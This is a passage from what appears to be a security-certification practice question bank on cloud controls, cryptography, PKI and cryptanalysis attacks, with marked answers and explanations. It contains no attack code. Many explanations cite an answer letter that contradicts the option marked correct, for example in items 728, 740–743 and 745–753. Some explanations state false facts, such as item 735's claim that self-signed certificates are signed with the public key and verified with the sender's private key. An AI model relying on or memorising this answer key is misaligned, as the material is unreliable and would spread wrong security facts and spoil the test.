> **Explanation:**
> Detective controls: These controls detect and react appropriately to the incidents that happen. For Example, employing IDSs, IPSs, and so on helps to detect attacks on cloud systems.

715. In which of the following cloud security control layers do the security controls DNSSEC, OAuth operates?
+ [ ] Management layer
+ [x] Network layer
+ [ ] Information layer
+ [ ] Computation and Storage layer
> **Explanation:**
> The network layer deals with various measures and policies adopted by a network administrator to monitor and prevent illegal access, misuse, modification, or denial of network-accessible resources. Some of the additional network layer security controls include NIDS/NIPS, firewalls, DPI, anti-DDoS, QoS, DNSSEC, OAuth, and so on.

# 20. Cryptography
## Cryptography Concepts and Algorithms
716. Some passwords are stored using specialized encryption algorithms known as hashes. Why is this an appropriate method?
+ [ ] It is impossible to crack hashed user passwords unless the key used to encrypt them is obtained.
+ [ ] Hashing is faster when compared to more traditional encryption algorithms.
+ [x] Passwords stored using hashes are nonreversible, making finding the password much more difficult.
+ [ ] If a user forgets the password, it can be easily retrieved using the hash key stored by administrators.
> **Explanation:**
> A password hash is an encrypted sequence of characters obtained after applying certain algorithms and manipulations on a user provided password.

717. Diffie-Hellman (DH) groups determine the strength of the key used in the key exchange process. Which of the following is the correct bit size of the Diffie-Hellman (DH) group 5?
+ [x] 1536 bit key
+ [ ] 1025 bit key
+ [ ] 2048 bit key
+ [ ] 768 bit key
> **Explanation:**
> The correct answer is “1536 bit key.”
> 
> Diffie-Hellman (DH) groups allows two parties to establish a shared key over an insecure channel. It was developed and published by Whitfield Diffie and Martin Hellman in 1976. Actually, it was independently developed a few years earlier by Malcolm J. Williamson of the British Intelligence Service, but it was classified.
> 
> There are multiple Diffie-Hellman groups:  
> + Diffie-Hellman group 1—768 bit group  
> + Diffie-Hellman group 2 —1024 bit group  
> + Diffie-Hellman group 5—1536 bit group  
> + Diffie-Hellman group 14—2048 bit group  
> + Diffie-Hellman group 19—256 bit elliptic curve  
> + Diffie-Hellman group 20—384 bit elliptic curve group

718. After gaining access to the password hashes used to protect access to a web-based application, the knowledge of which cryptographic algorithms would be useful to gain access to the application?
+ [ ] AES
+ [x] SHA1
+ [ ] Diffie-Helman
+ [ ] RSA
> **Explanation:**
> SHA-1 is a 160-bit hash function that resembles the former MD5 algorithm developed by Ron Rivest. It produces a 160-bit digest from a message with a maximum length of (264 − 1) bits. It was designed by the National Security Agency (NSA) to be part of the digital signature algorithm (DSA) and is most commonly used in security protocols such as PGP, TLS, SSH, and SSL. As of 2010, SHA-1 is no longer approved for cryptographic use because of cryptographic weaknesses.

719. Which cipher encrypts the plain text digit (bit or byte) one by one?
+ [ ] Modern cipher
+ [x] Stream cipher
+ [ ] Classical cipher
+ [ ] Block cipher
> **Explanation:**
> **Classical ciphers:** Classical ciphers are the most basic type of ciphers, which operate on alphabets (A-Z). Implementation of these ciphers is generally either by hand or with simple mechanical devices.
> 
> **Block ciphers:** Block ciphers determine algorithms operating on a block (group of bits) of fixed size with an unvarying transformation specified by a symmetric key.
> 
> **Modern ciphers:** The user can calculate the Modern ciphers with the help of a one-way mathematical function that is capable of factoring large prime numbers.
> 
> **Stream ciphers:** Symmetric key ciphers are plaintext digits combined with a key stream (pseudorandom cipher digit stream). Here, the user applies the key to each bit, one at a time. Examples include RC4, SEAL, etc.

720. What is the most secure way to mitigate the theft of corporate information from a laptop that was left in a hotel room?
+ [ ] Set a BIOS password.
+ [ ] Back up everything on the laptop and store the backup in a safe place.
+ [ ] Use a strong logon password to the operating system.
+ [x] Encrypt the data on the hard drive.
> **Explanation:**
> The most secure way to mitigate the theft of corporate information from a laptop is to encrypt the data on the hard drive. One can protect the data in the laptop by either by encrypting an entire partition on the hard disk or encrypting individual folders or files on the hard disk. Once the information is encrypted only, the person having access to the key or password can decrypt and read the information.

721. Which of the following is an example of an asymmetric encryption implementation?
+ [ ] MD5
+ [ ] SHA1
+ [x] PGP
+ [ ] 3DES
> **Explanation:**
> **SHA1** is a 160-bit hash function that resembles the former MD5 algorithm developed by Ron Rivest. It produces a 160-bit digest from a message with a maximum length of (264 − 1) bits.
> 
> **PGP** (pretty good privacy) is a protocol used to encrypt and decrypt data that provides authentication and cryptographic privacy. It is often used for data compression, digital signing, encryption and decryption of messages, e-mails, files, directories, and to enhance privacy of e-mail communications. The algorithm used for message encryption is RSA for key transport and IDEA for bulk-message encryption. PGP uses RSA for computing digital signatures and MD5 for computing message digests. PGP combines the best features of both conventional (about 1,000 times faster than public-key encryption) and public-key cryptography (solution to key distribution and data transmission issues) and is therefore known as hybrid cryptosystem.
> 
> **DES** is a standard for data encryption that uses a secret key for both encryption and decryption (symmetric cryptosystem). 3DES does DES three times with three different keys. 3DES uses a “key bundle” that comprises three DES keys, K1, K2, and K3. Each key is standard 56-bit DES key.

722. Which property ensures that a hash function will not produce the same hashed value for two different messages?
+ [ ] Key strength
+ [ ] Entropy
+ [x] Collision resistance
+ [ ] Bit length
> **Explanation:**
> Collision resistance is a property of cryptographic hash functions. A hash function H is collision resistant if it is hard to find two inputs that hash to the same output, that is, two inputs a and b such that H(a) = H(b), and a≠b.
> 
> Every hash function with more inputs than outputs will necessarily have collisions. Consider a hash function such as SHA-256 that produces 256 bits of output from an arbitrarily large input. Since it must generate one of 2256 outputs for each member of a much larger set of inputs, the pigeonhole principle guarantees that some inputs will hash to the same output. Collision resistance does not mean that no collisions exist; they are just simply hard to find.

723. Which of the following is optimized for confidential communications, such as bidirectional voice and video?
+ [ ] MD4
+ [ ] MD5
+ [ ] RC5
+ [x] RC4
> **Explanation:**
> RC4 is a variable key-size symmetric-key stream cipher with byte-oriented operations and it depends on the use of a random permutation. According to some analyses, the period of the cipher is likely to be greater than 10,100. Each output byte uses 8–16 system operations, meaning the cipher has the ability to run fast when used in software. Products like RSA SecurPC use this algorithm for file encryption. RC4 enables safe communications such as traffic encryption (which secures websites) and for websites that use the SSL protocol.

724. Advanced encryption standard is an algorithm used for which of the following?
+ [ ] Key recovery
+ [x] Bulk data encryption
+ [ ] Key discovery
+ [ ] Data integrity
> **Explanation:**
> The Advanced Encryption Standard (AES) is a National Institute of Standards and Technology (NIST) specification for the encryption of electronic data. It also helps to encrypt digital information such as telecommunications, financial, and government data. US government agencies have been using it to secure sensitive but unclassified material.

725. When setting up a wireless network, an administrator enters a preshared key for security. Which of the following is true?
+ [x] The key entered is a symmetric key used to encrypt the wireless data.
+ [ ] The key is an RSA key used to encrypt the wireless data.
+ [ ] The key entered is based on the Diffie–Hellman method.
+ [ ] The key entered is a hash that is used to prove the integrity of the wireless data.
> **Explanation:**
> Symmetric encryption requires that both the sender and the receiver of the message possess the same encryption key. The sender uses a key to encrypt the plaintext and sends the resultant ciphertext to the recipient, who uses the same key (used for encryption) to decrypt the ciphertext into plaintext. Symmetric encryption is also known as secret key cryptography as it uses only one secret key to encrypt and decrypt the data. This kind of cryptography works well when you are communicating with only a few people.

726. The fundamental difference between symmetric and asymmetric key cryptographic systems is that symmetric key cryptography uses__________________?
+ [x] The same key on each end of the transmission medium
+ [ ] Multiple keys for non-repudiation of bulk data
+ [ ] Different keys on both ends of the transport medium
+ [ ] Bulk encryption for data transmission over fiber
> **Explanation:**
> Symmetric cryptographic systems are those in which the sender and receiver of a message share a single common key that is used to encrypt and decrypt the message.

727. Which of the following algorithms provides better protection against brute force attacks by using a 160-bit message digest?
+ [ ] MD5
+ [x] SHA-1
+ [ ] MD4
+ [ ] RC4
> **Explanation:**
> MD5 can be cracked by brute-force attack and suffers from extensive vulnerabilities. RC4 is ideal for software implementation. MD4 is used to verify data integrity through the creation of a 128-bit message digest from data input.

728. What is the primary drawback of using Advanced Encryption Standard (AES) algorithm with a 256-bit key to share sensitive data?
+ [x] It is a symmetric key algorithm, meaning each recipient must receive the key through a different channel than the message.
+ [ ] Due to the key size, the time it will take to encrypt and decrypt the message hinders efficient communication.
+ [ ] It has been proven to be a weak cipher; therefore, should not be trusted to protect sensitive data.
+ [ ] To get messaging programs to function with this algorithm requires complex configurations.
> **Explanation:**
> The correct answer is (d).
> 
> Some of the other drawbacks of AES algorithm are as follows:  
> + It uses a too simple algebraic structure.  
> + Every block is always encrypted in the same way.  
> + It is hard to implement with software.  
> + AES in counter mode is complex to implement in software taking both performance and security into consideration.

729. Anyone can send an encrypted message to Bob but only Bob can read it. Using PKI, when Alice wishes to send an encrypted message to Bob, she looks up Bob’s public key in a directory, uses it to encrypt the message, and sends it off. Bob then uses his private key to decrypt the message and read it. No one listening in can decrypt the message. Thus, although many people may know the public key of Bob and use it to verify Bob’s signatures, they cannot discover Bob’s private key and use it to forge digital signatures. This is referred to as the principle of:
+ [ ] Non-repudiation
+ [ ] Asymmetry
+ [x] Irreversibility
+ [ ] Symmetry
> **Explanation:**
> Irreversibility is a cryptographic process that transforms data deterministically to a form from which the original data cannot be recovered, even by those who have full knowledge of the method of encryption. The process may be used to protect stored passwords in a system, where the password offered is first encrypted before it is matched against the stored encrypted password. Illegal access to the stored password therefore does not permit access to the system. With the help of this technique, even if an attacker obtains the victim’s public key he cannot discover the victim’s private key that is required to crack the message.

730. Which of the following is a symmetric cryptographic algorithm?
+ [ ] DSA
+ [x] 3DES
+ [ ] PKI
+ [ ] RSA
> **Explanation:**
> **DSA:** It is asymmetric cryptographic algorithm. The DSA helps in the generation and verification of digital signatures for sensitive and unclassified applications. Digital signature is a mathematical scheme used for the authentication of digital messages. Computation of the digital signature uses a set of rules (i.e., the DSA) and a set of parameters, in that the user can verify the identity of the signatory and integrity of the data.
> 
> **DHA:** It is asymmetric cryptographic algorithm. A cryptographic protocol that allows two parties to establish a shared key over an insecure channel.
> 
> **RSA:** It is asymmetric cryptographic algorithm. Ron Rivest, Adi Shamir, and Leonard Adleman formulated RSA, a public-key cryptosystem for encryption and authentication. RSA uses modular arithmetic and elementary number theories to perform computations using two large prime numbers.
> 
> **3DES:** It is symmetric cryptographic algorithm. Essentially, it does DES three times with three different keys. 3DES uses a “key bundle” which comprises three DES keys, K1, K2, and K3. Each key is standard 56-bit DES key.

731. What is the default port used by IPSEC IKE protocol?
+ [x] Port 500
+ [ ] Port 51
+ [ ] Port 50
+ [ ] Port 4500
> **Explanation:**
> + **IPSEC IKE:** IP Security Internet Key Exchange Protocol is used for establishing Security Association for IPsec Protocol Suite. IKE uses UDP port 500 for establishing security association.
> + UDP port 4500 is used IPsec NAT-T
> + Remote Mail Checking Protocol uses UDP/TCP port 50
> + Port 51 is reserved by IANA


## Public Key Infrastructure (PKI)
732. For messages sent through an insecure channel, a properly implemented digital signature gives the receiver reason to believe the message was sent by the claimed sender. While using a digital signature, the message digest is encrypted with which key?
+ [ ] Receiver's public key
+ [ ] Sender's public key
+ [ ] Receiver's private key
+ [x] Sender's private key
> **Explanation:**
> Digital signature: Digital signature uses asymmetric cryptography to simulate the security properties of a signature in digital, rather than written form. A digital signature is a cryptographic means of authentication. Public-key cryptography uses asymmetric encryption and helps the user to create a digital signature. The two types of keys in public key cryptography are the private key (only signer knows this key and uses it to create digital signature) and the public key (more widely known and a relying party uses it to verify the digital signature).

733. Which of the following defines the role of a root certificate authority (CA) in a public key infrastructure (PKI)?
+ [ ] The root CA is the recovery agent used to encrypt data when a user’s certificate is lost.
+ [x] The CA is the trusted root that issues certificates.
+ [ ] The root CA stores the user’s hash value for safekeeping.
+ [ ] The root CA is used to encrypt e-mail messages to prevent unintended disclosure of data.
> **Explanation:**
> A certificate authority can issue multiple certificates in the form of a tree structure. A root certificate is the top-most certificate of the tree; the private key that is used to “sign” other certificates. All certificates signed by the root certificate, with the "CA" field set to true, inherit the trustworthiness of the root certificate – a signature by a root certificate is somewhat analogous to “notarizing” an identity in the physical world. Such a certificate is called an intermediate certificate or subordinate CA certificate. Certificates further down the tree also depend on the trustworthiness of the intermediates.

734. Which of the following is a characteristic of public key infrastructure (PKI)?
+ [ ] Public-key cryptosystems are faster than symmetric-key cryptosystems.
+ [x] Public-key cryptosystems distribute public-keys within digital signatures.
+ [ ] Public-key cryptosystems do not require a secure key distribution channel.
+ [ ] Public-key cryptosystems do not provide technical nonrepudiation via digital signatures.
> **Explanation:**
> Public-key cryptography and the public-key/private-key pair provides an important benefit: the ability to widely distribute the public key on a server, or in a central directory, without jeopardizing the integrity of the private key component of the key pair. This eliminates the need to transmit the public key to every correspondent in the system.

735. Which of the following contains a public key and the identity of the owner and the corresponding private key is kept secret by the certification authorities?
+ [ ] b. Self-signed certificate
+ [ ] d. Registration authority (RA)
+ [x] c. Signed certificates
+ [ ] a. Validation authority (VA)
> **Explanation:**
> Validation authority and registration authority are the components of public key infrastructure. A self-signed certificate is an identity certificate signed by the same entity whose identity it certifies. Self-signed certificates are widely used for testing purposes. In self-signed certificates, a user creates a pair of public and private keys using a certificate creation tool such as Adobe Reader, Java’s keytool, Apple's Keychain, and so on and signs the document with the public key. The receiver requests the sender for the private key to verify the certificate.
> 
> However, in signed certificates, certification authorities (CAs) sign and issue signed certificates. These certificates contain a public key and the identity of the owner. The corresponding private key is kept secret by the CA. By issuing the certificate, the CA confirms or validates that the public key contained in the certificate belongs to the person, company, server, or other entity mentioned in the certificate. CA verifies an application’s credentials; thus, users and relying parties trust the information in the CA’s certificates. The CA takes accountability for saying, “Yes, this person is who they state they are, and we, the CA, certify that.” Some of the popular CAs include Comodo, IdenTrust, Symantec, and GoDaddy.

736. A network security administrator is worried about potential man-in-the-middle attacks when users access a corporate website from their workstations. Which of the following is the best remediation against this type of attack?
+ [ ] Implementing server-side PKI certificates for all connections
+ [ ] Requiring strong authentication for all DNS queries
+ [ ] Mandating only client-side PKI certificates for all connections
+ [x] Requiring client and server PKI certificates for all connections
> **Explanation:**
> A man-in-the-middle attack (MITM) is an attack where the attacker secretly relays and possibly alters the communication between two parties who believe they are directly communicating with each other. PKI certificates can be used to encrypt traffic between a client and the server. In this scenario, even if an attacker successfully sniffs the network, it will be difficult to decode the authentication tokens or cookies required for a MITM attack.
> 
> Both server and client certificates encompass the “Issued to” section. Here, for server certificate the “Issued to” section’s value will be the hostname for which it has to be issued and for the client certificate, it will be the user identity or the user name. Both client and server certificates are a significant indication for trust and safe transactions or accessing a website.

737. Company A and Company B have just merged and each has its own public key infrastructure (PKI). What must the certificate authorities (CAs) establish so that the private PKIs for Company A and Company B trust one another and each private PKI can validate digital certificates from the other company?
+ [ ] Cross-site exchange
+ [ ] Poly key exchange
+ [x] Cross certification
+ [ ] Poly key reference
> **Explanation:**
> Cross certification enables entities in one PKI to trust entities in another PKI. This mutual trust relationship is typically supported by a cross-certification agreement between the CAs in each PKI. The agreement establishes the responsibilities and liability of each party. A mutual trust relationship between two CAs requires that each CA issues a certificate to the other to establish the relationship in both the directions.

738. To send a PGP-encrypted message, which piece of information from the recipient must the sender have before encrypting the message?
+ [ ] Sender's public key
+ [x] Recipient's public key
+ [ ] Master encryption key
+ [ ] Recipient's private key
> **Explanation:**
> **Working of PGP:**
> + When a user encrypts data with PGP, PGP first compresses the data.  
> + Compressing data reduces patterns in the plaintext that could be exploited by most of the cryptanalysis techniques to crack the cipher, thus prominently increasing resistance to cryptanalysis.  
> + PGP then creates a random key (GSkAQk49fPD2h) that is a one-time-only secret key.  
> + PGP uses the random key generated to encrypt the plaintext resulting in ciphertext.  
> + Once data is encrypted, random key is encrypted with the recipient’s public key.  
> + Public key-encrypted random key (Td7YuEkLg99Qd0) is sent along with the ciphertext to the recipient.

739. A certificate authority (CA) generates a key pair that will be used for encryption and decryption of e-mails. The integrity of the encrypted e-mail is dependent on the security of which of the following?
+ [ ] Email server certificate
+ [ ] Modulus length
+ [x] Private key
+ [ ] Public key
> **Explanation:**
> PKI uses public-key cryptography, which is widely used on the Internet to encrypt messages or authenticate message senders. In public-key cryptography, a CA simultaneously generates a public and private key with the same algorithm. The private key is held only by the subject (user, company, or system) mentioned in the certificate, while the public key is made publicly available in a directory that all parties can access. The subject keeps the private key a secret and uses it to decrypt the text encrypted by someone else using the corresponding public key (available in a public directory). This way, others encrypt messages for the user with the user’s public key, and the user decrypts it with his/her private key.

740. Which element of public key infrastructure (PKI) verifies the applicant?
+ [x] Registration authority
+ [ ] Certificate authority
+ [ ] Verification authority
+ [ ] Validation authority
> **Explanation:**
> The correct answer is (c). Registration authority (RA): This acts as the verifier for the certificate authority.
> 
> The PKI role that assures valid and correct registration is called a registration authority (RA). An RA is responsible for accepting requests for digital certificates and authenticating the entity making the request. In a Microsoft PKI, a registration authority is usually called a subordinate CA.

741. Steve is the new CISO for a global corporation; he hired Dayna as a security consultant to do a security assessment. Steve wants to protect the corporate webpage with encryption and asks Dayna about the procedure to do that. Which of the following is the correct option?
+ [ ] You need to use quantum encryption.
+ [ ] You need to use Blowfish encryption.
+ [x] You need to use digital certificates.
+ [ ] You need to use digital signature.
> **Explanation:**
> The correct answer is (a). Dayna, the consultant, shows Steve the scenario for using digital certificates; the other answers are related but not correctly.

742. Which of the following processes of PKI (public key infrastructure) ensures that a trust relationship exists and that a certificate is still valid for specific operations?
+ [ ] Certificate issuance
+ [x] Certificate validation
+ [ ] Certificate cryptography
+ [ ] Certificate revocation
> **Explanation:**
> The correct answer is (b). The certificate validation is a process of verifying the authenticity of a certificate. This is done by the validation authority (VA).

743. Which of the following describes a component of public key infrastructure (PKI) where a copy of a private key is stored to provide third-party access and to facilitate recovery operations?
+ [ ] Recovery agent
+ [x] Key escrow
+ [ ] Directory
+ [ ] Key registry
> **Explanation:**
> The correct answer is (d). Key escrow is a key exchange arrangement in which essential cryptographic keys are stored with a third party in escrow. The third party can use or allow others to use the encryption keys under certain predefined circumstances.

744. A person approaches a network administrator and wants advice on how to send encrypted e-mail from home. The end user does not want to have to pay for any license fees or manage server services. Which of the following is the most secure encryption protocol that the network administrator should recommend?
+ [ ] IP Security (IPsec)
+ [ ] Hyper Text Transfer Protocol with Secure Socket Layer (HTTPS)
+ [ ] Multipurpose Internet Mail Extensions (MIME)
+ [x] Pretty Good Privacy (PGP)
> **Explanation:**
> PGP (pretty good privacy) is a protocol used to encrypt and decrypt data that provides authentication and cryptographic privacy. It is often used for data compression, digital signing, encryption and decryption of messages, e-mails, files, directories, and to enhance the privacy of e-mail communications. The algorithm used for message encryption is RSA. For key transport and IDEA for bulk-message encryption, PGP uses RSA for computing digital signatures and MD5 for computing message digests.
> 
> PGP combines the best features of both conventional (about 1,000 times faster than public-key encryption) and public-key cryptography (solution to key distribution and data transmission issues) and is therefore known as a hybrid cryptosystem. PGP is used for:
> + Encrypting a message or file prior to transmission so that only the recipient can decrypt and read it
> + Clear signing of the plaintext message to ensure the authenticity of the sender
> + Encrypting stored computer files so that no one other than the person who encrypted them can decrypt them
> + Deleting files, rather than just removing them from the directory or folder
> + Data compression for storage or transmission


## Cryptography Attacks
745. Which of the following cryptography attack methods is usually performed without the use of a computer?
+ [ ] Rainbow table attack
+ [x] Rubber hose attack
+ [ ] Ciphertext-only attack
+ [ ] Chosen key attack
> **Explanation:**
> The correct answer is (c). In a rubber hose attack, attackers extract cryptographic secrets (e.g. the password to an encrypted file) from a person by coercion or torture. Generally, people under pressure cannot maintain security, and they reveal secret or hidden information. Attackers torture the concerned person to reveal secret keys or passwords used to encrypt the information.

746. An attacker sniffs encrypted traffic from the network and is subsequently able to decrypt it. Which cryptanalytic technique can the attacker use now in his attempt to discover the encryption key?
+ [ ] Meet in the middle attack
+ [ ] Known plaintext attack
+ [x] Chosen ciphertext attack
+ [ ] Birthday attack
> **Explanation:**
> **Birthday attack:** A birthday attack is a name used to refer to a class of brute-force attacks against cryptographic hashes that makes the brute forcing easier. The birthday attack depends on birthday paradox. Birthday paradox is the probability that two or more people in a group of 23 share the same birthday is greater than 1/2.
> 
> **Known plaintext attack:** In this cryptanalysis attack, the only information available to the attacker is some plaintext blocks along with corresponding ciphertext and algorithm used to encrypt and decrypt the text. Using this information, the key used to generate ciphertext that is deduced so as to decipher other messages.
> 
> **Meet-in-the-middle attack:** A meet-in-the-middle attack is the best attack method for cryptographic algorithms using multiple keys for encryption. This attack reduces the number of brute force permutations needed to decode text encrypted by more than one key and conducted mainly for forging signatures on mixed type digital signatures. A meet-in-the-middle attack uses space–time tradeoff; it is a birthday attack, because it exploits the mathematics behind the birthday paradox. It takes less time than an exhaustive attack. It is called a meet-in-the-middle attack, because it works by encrypting from one end and decrypting from the other end, thus meeting “in the middle.”
> 
> **Chosen ciphertext attack:** In this cryptanalysis attack, an attacker obtains the plaintexts corresponding to an arbitrary set of ciphertexts of his own choice. Using this information, the attacker tries to recover the key used to encrypt the plaintext.

747. An attacker has captured a target file that is encrypted with public key cryptography. Which of the attacks below is likely to be used to crack the target file?
+ [ ] Replay attack
+ [x] Chosen plain-text attack
+ [ ] Memory trade-off attack
+ [ ] Timing attack
> **Explanation:**
> Timing attack: It is based on repeatedly measuring the exact execution times of modular exponentiation operations. The attacker tries to break the ciphertext by analyzing the time taken to execute the encryption and decryption algorithm for various inputs. In a computer, the time taken to execute a logical operation may vary based on the input given. The attacker by giving varying inputs tries to extract the plaintext.
> 
> Replay attack: In a replay attack, packets and authentication tokens are captured using a sniffer. After the relevant info is extracted, the tokens are placed back on the network to gain access. The attacker uses this type of attack to replay bank transactions or other similar types of data transfer, in the hope of replicating and/or altering activities, such as banking deposits or transfers.
> 
> Chosen-plaintext attack: Chosen plaintext attack is a very effective type of cryptanalysis attack. In this attack, the attacker obtains the ciphertexts corresponding to a set of plaintexts of his own choosing. This can allow the attacker to attempt to derive the key used and thus decrypt other messages encrypted with that key. Basically, since the attacker knows the plaintext and the resultant ciphertext, he has a lot of insight into the key used. This technique can be difficult but is not impossible.
> 
> The circumstances by which an attacker may obtain ciphertexts for given plaintexts are rare. However, modern cryptography is implemented in software or hardware and is used for a diverse range of applications; for many cases, a chosen-plaintext attack is often very feasible. Chosen-plaintext attacks become extremely important in the context of public key cryptography, where the encryption key is public and so attackers can encrypt any plaintext they choose.

748. Which of the following cryptanalysis methods is applicable to symmetric key algorithms?
+ [ ] Frequency Cryptanalysis
+ [ ] Linear cryptanalysis
+ [ ] Integral cryptanalysis
+ [x] Differential cryptanalysis
> **Explanation:**
> Differential cryptanalysis is a form of cryptanalysis applicable to symmetric key algorithms. It is the examination of differences in an input and how that affects the resultant difference in the output. It originally worked only with chosen plaintext. It can also work only with known plaintext and ciphertext.

749. An attacker tries to recover the plaintext of a message without knowing the required key in advance. For this he may first try to recover the key, or may go after the message itself by trying every possible combination of characters. Which code breaking method is he using?
+ [ ] One-time pad
+ [x] Brute force
+ [ ] Trickery and deceit
+ [ ] Frequency analysis
> **Explanation:**
> The correct answer is (a). Brute force: This attack is a common cryptanalytic technique, or exhaustive search, in which the keys are determined by trying every possible combination of characters. The efficiency of a brute-force attack depends on the hardware configuration. The use of faster processors means testing more keys per second. Cryptanalysts carried out a successful brute-force attack on a DES encryption method that effectively made DES obsolete.

750. In which of the following attacks, can an attacker obtain ciphertexts encrypted under two different keys and gather plaintext and matching ciphertext?
+ [x] Related-key attack
+ [ ] Chosen-plaintext attack
+ [ ] Adaptive chosen-plaintext attack
+ [ ] Ciphertext-only attack
> **Explanation:**
> The correct answer is (c). Related-key attack: The related-key attack is similar to the chosen plaintext attack, except that the attacker can obtain ciphertexts encrypted under two different keys. This is actually a very useful attack if one can obtain the plaintext and matching ciphertext. The attack requires that the differing keys be closely related, for example, in a wireless environment where subsequent keys might be derived from previous keys. Then, while the keys are different, they are close. Much like the ciphertext-only attack, this one is most likely to yield a partial break.

751. An attacker breaks an n bit key cipher into 2 n/2 number of operations in order to recover the key. Which cryptography attack is he performing?
+ [ ] Known-plaintext attack
+ [ ] Rubber hose attack
+ [x] Chosen-key attack
+ [ ] Timing attack
> **Explanation:**
> The attacker obtains the plaintexts corresponding to an arbitrary set of ciphertexts of his own choice. Using this information, the attacker tries to recover the key used to encrypt the plaintext. To perform this attack, the attacker must have access to the communication channel between the sender and the receiver.

752. Out of the following attacks, which attack is a physical attack that is performed on a cryptographic device/cryptosystem to gain sensitive information?
+ [ ] DUHK attack
+ [x] Side channel attack
+ [ ] MITM attack
+ [ ] Hash collision attack
> **Explanation:**
> The correct answer is (a). In a side channel attack, an attacker monitors channels (environmental factors) and tries to acquire the information useful for cryptanalysis. The information collected in this process is termed as side channel information. Side channel attacks do not relate with traditional/ theoretical form of attacks like brute force attack. The concept of the side channel attack depends on the way systems implement cryptographic algorithms, rather than the algorithm itself.

753. Which of the following attacks mainly affects any hardware/software using an ANSI X9.31 random number generator (RNG)?
+ [x] DUHK attack
+ [ ] Side channel attack
+ [ ] Hash collision attack
+ [ ] Rainbow table attack
> **Explanation:**
> The correct answer is (b). DUHK (don't use hard-coded keys) is a cryptographic vulnerability that allows attackers to obtain encryption keys used to secure VPNs and web sessions. This attack mainly affects any hardware/software using ANSI X9.31 random number generator (RNG). The pseudorandom number generators (PRNGs) generate random sequences of bits based on the initial secret value called a seed and the current state. The PRNG algorithm generates cryptographic keys that are used to establish a secure communication channel over VPN network. In some cases, the seed key is hardcoded into the implementation. Both the factors are the key issues of DUHK attack as any attacker could combine ANSI X9.31 with the hard coded seed key to decrypt the encrypted data sent or received by that device.

754. Out of the following, identify the attack that is used for cracking a cryptographic algorithm using multiple keys for encryption.
+ [ ] Side Channel Attack
+ [x] Meet-in-the-middle Attack
+ [ ] DUHK Attack
+ [ ] Rainbow Table Attack
> **Explanation:**
> A meet-in-the-middle attack is the best attack method for cryptographic algorithms using multiple keys for encryption. This attack reduces the number of brute force permutations needed to decode text encrypted by more than one key and conducted mainly for forging signatures on mixed type digital signatures. A meet-in-the-middle attack uses space–time tradeoff; it is a birthday attack because it exploits the mathematics behind the birthday paradox. It is called a meet-in-the-middle attack because it works by encrypting from one end and decrypting from the other end, thus meeting “in the middle.”
> 
> In the meet-in-the-middle attack, the attacker uses a known plaintext message and has access to both the plaintext as well as the respective encrypted text. It takes less time than an exhaustive attack and is used by attackers for forging signatures, even on digital signatures that use the multiple-encryption scheme.

